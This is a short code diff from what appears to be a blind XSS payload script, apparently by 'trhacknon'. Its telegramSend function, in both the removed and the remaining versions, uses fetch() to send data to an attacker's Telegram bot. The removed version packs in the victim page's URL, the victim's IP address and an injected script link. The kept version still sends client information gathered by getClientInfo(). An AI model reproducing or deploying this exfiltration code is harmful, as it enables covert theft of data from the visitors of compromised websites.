@@ -65,28 +65,9 @@ Check out the chaos:
     alert(popupContent);
 }
 
-function telegramSend(textData, ipAddress) {
-    var payloadLink = `${document.location.href}?payload=<script>alert("Blind XSS Madness!");</script>`;
-
-    var telegramMessage = `
-🚀 Blind XSS Madness Alert by trhacknon 🚀
-------------------------------------------
-
-- URL Target -
-${document.location.href}
-
-- Payload Execution -
-[${payloadLink}](https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("Blind XSS Madness! Check out the chaos: " + payloadLink)}&parse_mode=html)
-
-- IP Address -
-${ipAddress}
-
-🤪 This is Blind XSS Madness! 🤪
-`;
-
-    fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMessage)}&parse_mode=markdown`)
+function telegramSend(textData) {
+    fetch(`https://api.telegram.org/bot${tokenBot}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(textData)}&parse_mode=html`)
         .catch(error => console.error('Failed to send message to Telegram:', error));
 }
-
 // Call the function to obtain client information
 getClientInfo();
